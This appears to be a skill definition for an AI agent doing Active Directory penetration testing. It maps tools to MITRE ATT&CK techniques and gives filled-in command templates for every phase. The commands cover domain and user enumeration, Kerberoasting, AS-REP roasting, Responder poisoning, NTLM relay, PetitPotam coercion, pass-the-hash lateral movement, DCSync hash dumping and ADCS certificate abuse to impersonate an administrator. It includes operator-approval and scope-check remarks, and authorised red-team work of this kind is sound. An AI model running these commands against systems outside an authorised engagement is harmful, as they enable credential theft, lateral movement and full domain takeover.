---
name: active-directory
description: >
  Active Directory and Windows domain attack techniques including domain
  enumeration, Kerberos attacks, credential relay, lateral movement, and
  domain privilege escalation for internal penetration testing engagements.
  Use this skill whenever the user mentions Active Directory, AD attacks,
  domain enumeration, BloodHound, Kerberoasting, AS-REP roasting, pass the
  hash, pass the ticket, overpass the hash, golden ticket, silver ticket,
  DCSync, DCShadow, NTDS.dit extraction, LDAP enumeration, domain controller,
  Group Policy abuse, ACL abuse, delegation abuse, constrained delegation,
  unconstrained delegation, resource-based constrained delegation, ADCS attacks,
  certificate abuse, LAPS, gMSA, domain trust attacks, forest trust, or any
  Windows domain-focused penetration testing activity.
  Also trigger for: impacket, crackmapexec, evil-winrm, bloodhound-python,
  kerbrute, responder, ntlmrelayx, petitpotam, certipy, rubeus, mimikatz,
  powerview, sharphound, enum4linux, smbclient, rpcclient, "enumerate the
  domain", "dump domain hashes", "escalate to domain admin".
  Expert tools: impacket (protocol suite), BloodHound (attack path mapping),
  crackmapexec (multi-protocol), certipy (ADCS), Responder (poisoning).
compatibility:
  tools: [bash, python]
  mcps: [desktop-commander, hexstrike]
  skills: [post-exploit, credential-attack, scope-guard]
---

# Active Directory Attack Skill

## Overview

Comprehensive Active Directory attack methodology covering enumeration through
domain compromise. Maps attack techniques to MITRE ATT&CK and uses best-in-class
tools for each phase. Every action requires operator approval and scope validation.

## Expert Tool Selection

| Phase | Best Tool | Alternative | MITRE ATT&CK |
|-------|-----------|-------------|---------------|
| Domain enumeration | **BloodHound + bloodhound-python** | ldapsearch, enum4linux-ng | T1087 |
| User enumeration | **kerbrute** | crackmapexec, rpcclient | T1087.002 |
| Kerberoasting | **impacket GetUserSPNs.py** | Rubeus (on-host) | T1558.003 |
| AS-REP Roasting | **impacket GetNPUsers.py** | Rubeus | T1558.004 |
| Password spraying | **crackmapexec** | kerbrute, spray | T1110.003 |
| NTLM relay | **impacket ntlmrelayx** | Responder + MultiRelay | T1557.001 |
| LLMNR/NBT-NS poison | **Responder** | Inveigh (Windows) | T1557.001 |
| Coerce authentication | **PetitPotam** | PrinterBug, DFSCoerce | T1187 |
| Pass the hash | **impacket psexec/wmiexec** | crackmapexec | T1550.002 |
| DCSync | **impacket secretsdump.py** | mimikatz | T1003.006 |
| ADCS abuse | **certipy** | Certify (on-host) | T1649 |
| Lateral movement | **crackmapexec** | evil-winrm, impacket | T1021 |

## Core Instructions

### Phase 1 — Domain Enumeration (from authenticated position)

```bash
# Null session check (unauthenticated)
enum4linux-ng -A {dc_ip}
rpcclient -U "" -N {dc_ip} -c "enumdomusers"

# With credentials — LDAP enumeration
ldapsearch -x -H ldap://{dc_ip} -D "{user}@{domain}" -w "{pass}" \
  -b "DC={domain_part1},DC={domain_part2}" "(objectClass=user)" \
  sAMAccountName description memberOf

# BloodHound collection (BEST for attack path analysis)
bloodhound-python -d {domain} -u {user} -p {pass} -ns {dc_ip} -c all \
  --zip -o /tmp/pentest/{target}/bloodhound/

# CrackMapExec domain intel
crackmapexec smb {dc_ip} -u {user} -p {pass} --groups
crackmapexec smb {dc_ip} -u {user} -p {pass} --users
crackmapexec smb {dc_ip} -u {user} -p {pass} --shares
crackmapexec smb {dc_ip} -u {user} -p {pass} --pass-pol
```

### Phase 2 — Kerberos Attacks

```bash
# User enumeration via Kerberos (no auth needed)
kerbrute userenum --dc {dc_ip} -d {domain} users.txt

# Kerberoasting — request TGS tickets for cracking
impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc_ip} -request \
  -outputfile /tmp/pentest/{target}/kerberoast.txt

# AS-REP Roasting — users with no preauth
impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -usersfile users.txt \
  -format hashcat -outputfile /tmp/pentest/{target}/asrep.txt

# Crack Kerberos tickets (hand off to credential-attack skill)
# Kerberoast: hashcat -m 13100
# AS-REP:    hashcat -m 18200
```

### Phase 3 — Credential Relay & Coercion

```bash
# Start Responder for LLMNR/NBT-NS poisoning
# ⚠️ OPERATOR MUST APPROVE — this is active network manipulation
responder -I {interface} -rdwv

# NTLM relay to target
impacket-ntlmrelayx -tf targets.txt -smb2support

# PetitPotam coercion (forces DC to authenticate to attacker)
# ⚠️ HIGH IMPACT — operator must confirm
python3 PetitPotam.py {attacker_ip} {dc_ip}
```

### Phase 4 — Lateral Movement & Privilege Escalation

```bash
# Pass-the-Hash
impacket-psexec {domain}/{user}@{target_ip} -hashes :{ntlm_hash}
impacket-wmiexec {domain}/{user}@{target_ip} -hashes :{ntlm_hash}

# Evil-WinRM (if WinRM enabled)
evil-winrm -i {target_ip} -u {user} -H {ntlm_hash}

# DCSync (requires Replicating Directory Changes privileges)
impacket-secretsdump {domain}/{user}:{pass}@{dc_ip} -just-dc-ntlm

# ADCS certificate abuse
certipy find -u {user}@{domain} -p {pass} -dc-ip {dc_ip}
certipy req -u {user}@{domain} -p {pass} -ca {ca_name} \
  -template {vuln_template} -upn administrator@{domain}
```

## Attack Path Narrative Template

```
1. Initial foothold: {user}@{workstation} (phishing/vuln exploitation)
2. Domain enumeration: BloodHound identified {attack_path}
3. Kerberoasting: Cracked SPN account {svc_account} → {password}
4. Lateral movement: {svc_account} → {server} via WMI
5. Privilege escalation: {method} → Domain Admin
6. DCSync: Extracted all domain hashes
7. Business impact: Full domain compromise — {N} users, {M} servers
```

## Output Checklist

- [ ] Domain enumeration completed (users, groups, trusts, GPOs)
- [ ] BloodHound data collected and shortest attack paths identified
- [ ] Kerberos attacks attempted (Kerberoast, AS-REP roast)
- [ ] Password policy analyzed (lockout threshold, complexity)
- [ ] Lateral movement only to in-scope hosts (scope-guard validated)
- [ ] All credentials handled securely
- [ ] Attack path documented for red-team-report
- [ ] MITRE ATT&CK technique IDs mapped to each action
